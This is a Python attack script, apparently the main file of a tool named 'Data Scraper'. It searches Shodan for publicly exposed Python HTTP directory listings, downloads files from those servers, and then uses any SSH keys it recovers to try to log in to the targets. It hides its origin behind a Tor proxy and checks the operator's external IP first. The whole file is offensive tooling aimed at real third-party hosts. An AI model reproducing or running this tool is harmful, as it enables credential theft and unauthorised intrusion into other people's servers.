#!/usr/bin/python3
# Title:"Directory listing for /" port:{args.port}
import argparse
import sys
import requests
import sqlite3
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

from src.Scan import Scan
from src.Target import Target
from src.Download import Download
from src.helper import *

from executors import SSHTarget
from parsers import check_downloads_dir


def opsec_check(session: requests.Session) -> str:
    try:
        pre = session.get("http://icanhazip.com", timeout=10)
        print(f"[+] Current External IP: {pre.text}", end="")
        user_choice = input("Continue [Y/n]: ").lower().strip()
        if user_choice in ("n", "no"):
            print("Ok, exiting...")
            sys.exit(5)
    except requests.exceptions.ConnectTimeout as error:
        print(f"Connection timeout: {error}")
        sys.exit(6)
    except requests.exceptions.ConnectionError as error:
        print(f"Proxy connection failed, check your proxy")
        sys.exit(7)
    return pre.text


def get_targets(proxy, verbose) -> None:
    conn = sqlite3.connect("db/database.db")
    cursor = conn.cursor()
    cursor.execute("SELECT ip_addr, port FROM ToScan")

    targets = cursor.fetchall()
    conn.close()

    with ThreadPoolExecutor(max_workers=4) as executor:
        for host, port in targets:
            target = Target(host, port, proxy=proxy, verbose=verbose)
            executor.submit(target.do_scan)


def get_download_targets(proxy, verbose):
    conn = sqlite3.connect("db/database.db")
    cursor = conn.cursor()
    cursor.execute("SELECT ip_addr, port, path from DownloadTargets")

    targets = cursor.fetchall()
    conn.close()
    with ThreadPoolExecutor(max_workers=4) as executor:
        for host, port, path in targets:
            download_requests = Download(host, port, path, proxy=proxy, verbose=verbose)
            executor.submit(download_requests.do_download)


def log_program_execution() -> None:
    with open("runtime.log", "a") as fp:
        dt = datetime.now()
        format_date = dt.strftime("%Y-%m-%d %H:%M:%S")
        fp.write(f"started script {format_date}\n")


def warning(external_ip: str) -> bool:
    print(f"[!] Current External Ip: {external_ip.strip("\n")}")
    choice = (
        input(
            "[!] About to connect to target, are you sure you want to do that? [y/N]: "
        )
        .strip()
        .lower()
    )
    if choice in {"yes", "y"}:
        return True
    # be more inclusive with the no option
    return False


def main(args):
    banner()

    if args.query and not args.port:
        print("[-] -p port required for a query.")
        return

    # do not place the opsec_check above this line
    session = requests.Session()
    if args.tor:
        session.proxies.update(
            {
                "http": f"socks5h://{args.tor}",
                "https": f"socks5h://{args.tor}",
            }
        )

    if not args.noninteractive:
        external_ip = opsec_check(session)

    if args.query:
        scan = Scan(proxy=args.tor, port=args.port, verbose=args.verbose)
        scan.run_query(f'Title:"Directory listing for /" port:{args.port}')
    elif args.scan:
        get_targets(args.tor, args.verbose)
        get_download_targets(args.tor, args.verbose)
    elif args.exploit:
        if not warning(external_ip):
            return
        check_downloads_dir(args.tor)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        prog="Data Scraper",
        description="Query Shodan for indexable HTTP servers and enumerate exposed files",
    )

    action_group = parser.add_mutually_exclusive_group(required=True)
    action_group.add_argument(
        "-q",
        "--query",
        help="Query the shodan api for exposed python http servers",
        action="store_true",
    )
    action_group.add_argument(
        "-s",
        "--scan",
        help="Scan the exposed python http server and download interesting files",
        action="store_true",
    )
    action_group.add_argument(
        "-e",
        "--exploit",
        help="Discover downloaded ssh keys and attempt to access the targets",
        action="store_true",
    )

    parser.add_argument("-t", "--tor", help="SOCKS proxy ip:port", default=None)
    parser.add_argument("-p", "--port", help="Target port", required=False)
    parser.add_argument(
        "-n",
        "--noninteractive",
        help="Run and do not prompt",
        required=False,
        action="store_true",
    )
    parser.add_argument("-v", "--verbose", action="store_true")

    args = parser.parse_args()
    main(args)
